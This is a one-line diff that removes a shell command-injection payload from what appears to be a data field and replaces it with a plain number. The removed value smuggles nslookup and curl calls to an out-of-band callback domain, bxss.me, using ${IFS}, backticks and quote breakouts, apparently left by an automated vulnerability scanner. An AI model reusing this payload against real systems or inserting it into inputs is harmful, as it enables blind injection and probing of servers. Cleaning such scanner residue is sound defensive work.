@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitdlcololiosf72c8.bxss.me||curl${IFS}hitdlcololiosf72c8.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitdlcololiosf72c8.bxss.me||curl${IFS}hitdlcololiosf72c8.bxss.me)&`'
+5559567345
